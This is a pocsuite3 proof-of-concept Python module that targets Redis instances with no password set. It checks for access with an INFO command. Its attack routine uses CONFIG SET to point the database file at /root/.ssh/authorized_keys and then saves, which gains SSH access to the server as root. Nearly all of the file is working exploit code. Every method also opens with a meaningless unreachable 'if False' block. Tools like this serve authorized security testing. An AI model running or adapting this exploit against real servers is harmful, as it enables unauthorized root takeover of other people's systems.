"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import socket
from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE

class DemoPOC(POCBase):
    vulID = '89339'
    version = '3'
    author = ['seebug']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-12-09'
    references = ['http://sebug.net/vuldb/ssvid-89339']
    name = 'Redis 未授权访问'
    appPowerLink = 'http://redis.io/'
    appName = 'Redis'
    appVersion = 'All'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '\n        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。\n        说明：“此版本通过生成公钥写入redis文件后直接运行此脚本可在服务器上/root/.ssh文件下生成公钥”\n    '
    samples = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = POC_CATEGORY.PROTOCOL.REDIS

    def _verify(self):
        if False:
            for i in range(10):
                print('nop')
        result = {}
        payload = b'*1\r\n$4\r\ninfo\r\n'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option('rhost')
            port = self.getg_option('rport') or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and b'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Info'] = 'Redis未授权访问'
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_verify(result)

    def _attack(self):
        if False:
            while True:
                i = 10
        result = {}
        payload = b'config set dir /root/.ssh/\r\n'
        payload2 = b'config set dbfilename "authorized_keys"\r\n'
        payload3 = b'save\r\n'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option('rhost')
            port = self.getg_option('rport') or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata1 = s.recv(1024)
            s.send(payload2)
            recvdata2 = s.recv(1024)
            s.send(payload3)
            recvdata3 = s.recv(1024)
            if recvdata1 and b'+OK' in recvdata1:
                if recvdata2 and b'+OK' in recvdata2:
                    if recvdata3 and b'+OK' in recvdata3:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['Info'] = 'Redis未授权访问EXP执行成功'
                        result['VerifyInfo']['URL'] = host
                        result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_attack(result)

    def parse_attack(self, result):
        if False:
            print('Hello World!')
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_verify(self, result):
        if False:
            while True:
                i = 10
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)